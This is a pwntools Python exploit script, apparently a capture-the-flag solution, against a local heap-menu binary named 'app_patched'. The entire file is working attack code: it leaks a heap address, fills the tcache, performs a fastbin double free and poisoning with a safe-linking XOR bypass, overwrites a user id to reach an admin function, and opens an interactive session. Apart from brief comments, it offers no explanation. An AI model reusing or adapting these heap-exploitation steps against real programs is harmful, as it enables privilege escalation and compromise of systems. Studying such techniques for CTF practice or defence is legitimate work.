#!/usr/bin/env python3

from pwn import *

exe = ELF('./app_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)


def write(rate):
	sla(b"> ", b"1")
	sla(b"> ", rate)

def delete(idx):
	sla(b"> ", b"2")
	sla(b"> ", f"{idx}".encode())

def show():
	sla(b"> ", b"3")

def scream(arr, q = True):
	sla(b"> ", b"4")
	for e in arr:
		sl(e)
	if(q): # quit or not quit
		sl(b"quit")

def doadmin():
	sla(b"> ", b"5")

script = '''
#getchoice
brva 0x2CB7
'''

p = process('./app_patched')
#p = gdb.debug('./app_patched', gdbscript = script)

sla(b"username: ", b"A" * 0x7)
sla(b"password: ", b"B" * 0x7)

# heap fengshui
write(b"C" * 0x17)
delete(1)

# leak heap
show()
rcu(b"1: ")
user = ((u64(p.recv(5).ljust(8, b"\x00"))) << 12) + 0x2b0
lleak("user", user)

write(b"B" * 0x17)
write(b"C" * 0x17)

# fill up tcache
arr = []
for i in range(7):
	arr += [f"{i}".encode() * 0x17]
scream(arr)

# double free fastbin
delete(1)
delete(3)
delete(1)

# take out 7 chunk from tcache
for i in range(7):
	write(b"X" * 0x17)

# fastbin poisoning -> tcache dumping
target = (user + 0x60) ^ (user + 0x70) >> 12
payload = p64(target).ljust(0x17, b"Y")
write(payload)

# padding to target
for i in range(2):
	write(b"Z" * 0x17) 

# overwrite user id, some std:map ptr
payload = p64(user + 0x140) + p64(3) + p64(0)
write(payload[:0x17:])

doadmin()

#debug()

p.interactive()
